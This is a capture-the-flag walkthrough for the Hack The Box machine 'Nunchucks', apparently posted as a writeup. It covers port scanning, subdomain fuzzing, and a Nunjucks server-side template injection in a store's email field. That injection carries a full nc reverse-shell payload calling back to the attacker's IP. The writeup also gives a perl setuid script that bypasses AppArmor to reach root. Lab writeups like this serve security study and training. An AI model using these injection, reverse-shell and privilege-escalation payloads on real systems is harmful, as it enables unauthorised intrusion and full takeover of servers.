![image](https://user-images.githubusercontent.com/105310322/196730660-c5ef0194-cbad-4040-9a86-2d7f0c361d86.png)


### Tools: 

### Vulnerabilities: 

Nmap reveals 3 ports open, SSH, HTTP, and HTTPS. They give us the domain so lets add that to our hosts file.

```console
└─$ nmap -A -p- -T4 -Pn 10.129.95.252
Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-18 15:12 CDT
Nmap scan report for 10.129.95.252
Host is up (0.079s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 6c146dbb7459c3782e48f511d85b4721 (RSA)
|   256 a2f42c427465a37c26dd497223827271 (ECDSA)
|_  256 e18d44e7216d7c132fea3b8358aa02b3 (ED25519)
80/tcp  open  http     nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to https://nunchucks.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: 400 The plain HTTP request was sent to HTTPS port
| ssl-cert: Subject: commonName=nunchucks.htb/organizationName=Nunchucks-Certificates/stateOrProvinceName=Dorset/countryName=UK
| Subject Alternative Name: DNS:localhost, DNS:nunchucks.htb
| Not valid before: 2021-08-30T15:42:24
|_Not valid after:  2031-08-28T15:42:24
| tls-alpn: 
|_  http/1.1
| tls-nextprotoneg: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.49 seconds
```
Feroxbuster gives a few things interesting things like the login page.

```console
└─$ feroxbuster -u https://nunchucks.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -x php,html,txt,git,pdf -q -k
WLD      GET        3l        6w       45c Got 200 for https://nunchucks.htb/efd7c3c056164989a56670de5c928281 (url length: 32)
WLD      GET         -         -         - Wildcard response is static; auto-filtering 45 responses; toggle this behavior by using --dont-filter
WLD      GET        3l        6w       45c Got 200 for https://nunchucks.htb/5de72f6e1ba949ebb8cfd289964c9f0a464042bc5b6440818c6b4b702744caf88948eb8241f64d4086555180d4b75b7b (url length: 96)
200      GET      546l     2271w    30589c https://nunchucks.htb/
200      GET      183l      662w     9172c https://nunchucks.htb/login
301      GET       10l       16w      179c https://nunchucks.htb/assets => /assets/
301      GET       10l       16w      193c https://nunchucks.htb/assets/images => /assets/images/
301      GET       10l       16w      185c https://nunchucks.htb/assets/js => /assets/js/
301      GET       10l       16w      187c https://nunchucks.htb/assets/css => /assets/css/
200      GET      250l     1863w    19134c https://nunchucks.htb/privacy
200      GET      187l      683w     9488c https://nunchucks.htb/signup
200      GET      245l     1737w    17753c https://nunchucks.htb/terms
Scanning: https://nunchucks.htb
Scanning: https://nunchucks.htb/
Scanning: https://nunchucks.htb/assets
Scanning: https://nunchucks.htb/assets/images
Scanning: https://nunchucks.htb/assets/js
Scanning: https://nunchucks.htb/assets/css
```
Checking out the terms and privacy pages we get a bunch of hints about a possible template injection. Looking more into it the firefox extension wappalyzer tells me NodeJS is running. Also looking up some SSTI on Hacktricks says that Nunjucks is running on SSTI! The fact that the box's name was Nunchucks means there is a really good chance this is the attack vector. However I was not able to find any vulnerabilties on this webpage. So lets fuzz for some more.












Running wfuzz we are finally able to locate another domain!

```console
└─$ wfuzz -c -H "Host: FUZZ.nunchucks.htb" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt --hw 2271 https://nunchucks.htb
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: https://nunchucks.htb/
Total requests: 100000

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                     
=====================================================================

000000037:   200        101 L    259 W      4028 Ch     "store"                                                                                     
 /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...

Total time: 5.600609
Processed Requests: 197
Filtered Requests: 196
Requests/sec.: 35.17474
```
On this webpage we have a single input field and if we test out an SSTI it takes it!

https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#nunjucks

The following is the payload I used in burp suite after capturing the store.nunchucks.htb input button.

```
POST /api/submit HTTP/1.1
Host: store.nunchucks.htb
Cookie: _csrf=2Zc7PPzLntxukEPB3DAKztkS
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://store.nunchucks.htb/
Content-Type: application/json
Origin: https://store.nunchucks.htb
Content-Length: 19
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close

{"email":"{{7*7}}"}
```
Now that we have finally confirmed that it is an SSTI we can form the rest of the payload. Hacktricks gave the basics of the command but in order for this payload to work I had to use \ to escape the "", otherwise the payload wouldnt work and URL encoding had no effect.

Set up your listener and send the reverse shell payload.

Note: Another version of this would be to send it commands and create your own SSH keys on the target to login. Since the SSH Port is open.

```
POST /api/submit HTTP/1.1
Host: store.nunchucks.htb
Cookie: _csrf=2Zc7PPzLntxukEPB3DAKztkS
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://store.nunchucks.htb/
Content-Type: application/json
Origin: https://store.nunchucks.htb
Content-Length: 150
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close

{"email":"{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.16 1234 >/tmp/f')\")()}}"}
```

We get a shell, the flag, and upgrade to an interactive shell!

```console
└─$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.10.16.16] from (UNKNOWN) [10.129.95.252] 59850
sh: 0: can't access tty; job control turned off
$ id
uid=1000(david) gid=1000(david) groups=1000(david)
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
david@nunchucks:/var/www/store.nunchucks$ 
```
```console
david@nunchucks:~$ cat user.txt
cat user.txt
3c82****************************
```

In my enumeration I found that perl was vulnerable from its capabilities with cap_setuid. However nothing I did was working.

https://gtfobins.github.io/gtfobins/perl/





It turns out that it had apparmor enabled as can be seen by this file. Basically we could run ```perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'``` but it would not execute the shell. However changing the command to whoami or id showed that it was running as root.

```console
david@nunchucks:/tmp$ cat /etc/apparmor.d/usr.bin.perl
cat /etc/apparmor.d/usr.bin.perl
# Last Modified: Tue Aug 31 18:25:30 2021
#include <tunables/global>

/usr/bin/perl {
  #include <abstractions/base>
  #include <abstractions/nameservice>
  #include <abstractions/perl>

  capability setuid,

  deny owner /etc/nsswitch.conf r,
  deny /root/* rwx,
  deny /etc/shadow rwx,

  /usr/bin/id mrix,
  /usr/bin/ls mrix,
  /usr/bin/cat mrix,
  /usr/bin/whoami mrix,
  /opt/backup.pl mrix,
  owner /home/ r,
  owner /home/david/ r,

}
```
With a quick google search I came to this page which gives the answer. By putting the exploit into a script we can bypass the apparmor and gain root.

http://0xma.com/hacking/bypass_apparmor_with_perl_script.html

Your script should look something like this.

```perl
#!/usr/bin/perl
use POSIX qw(strftime);
use POSIX qw(setuid);
POSIX::setuid(0);

exec "/bin/sh"
```
After running it we can confirm our id is root and get the flag!

```console
david@nunchucks:/tmp$ ./rogue.pl
./rogue.pl
# id
id
uid=0(root) gid=1000(david) groups=1000(david)
# cat /root/root.txt
cat /root/root.txt
5a9*****************************
# 
```
Congrats!
